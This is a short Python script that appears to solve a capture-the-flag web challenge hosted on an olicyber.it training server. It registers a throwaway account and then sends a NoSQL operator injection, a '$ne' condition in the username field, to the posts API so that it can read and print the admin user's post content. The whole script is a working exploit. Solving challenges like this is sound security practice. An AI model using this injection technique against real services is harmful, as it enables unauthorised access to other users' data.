#!/bin/python3

import requests
import random
import string


def random_string(k=10):
    return ''.join(random.choices(string.ascii_letters, k=k))

data = {
    'username': random_string(k=20),
    'password': random_string(k=20)
}

base_url = 'http://gabibbo_kontakte.challs.olicyber.it'

s = requests.Session()

r = s.post(f'{base_url}/register', json=data)

r = s.post(f'{base_url}/api/posts', json={
    'username':{
        '$ne':''
    }
})

for x in r.json():
    if x['username'] == 'admin':
        print(x['content'])